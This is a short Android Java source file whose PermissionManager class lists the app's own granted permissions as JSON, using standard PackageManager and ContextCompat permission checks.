package com.fason.app.core.permissions;

import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;

import androidx.core.content.ContextCompat;

import com.fason.app.core.FasonApp;

import org.json.JSONArray;
import org.json.JSONObject;

public class PermissionManager {

    public static JSONObject getGrantedPermissions() {
        JSONObject data = new JSONObject();
        try {
            Context ctx = FasonApp.getContext();
            JSONArray perms = new JSONArray();
            PackageInfo pi = ctx.getPackageManager().getPackageInfo(ctx.getPackageName(), PackageManager.GET_PERMISSIONS);

            if (pi.requestedPermissions != null) {
                for (String perm : pi.requestedPermissions) {
                    if (canIUse(perm)) perms.put(perm);
                }
            }
            data.put("permissions", perms);
        } catch (Exception e) {
            try { data.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return data;
    }

    public static boolean canIUse(String perm) {
        if (perm == null) return false;
        try {
            return ContextCompat.checkSelfPermission(FasonApp.getContext(), perm) == PackageManager.PERMISSION_GRANTED;
        } catch (Exception e) {
            return false;
        }
    }
}
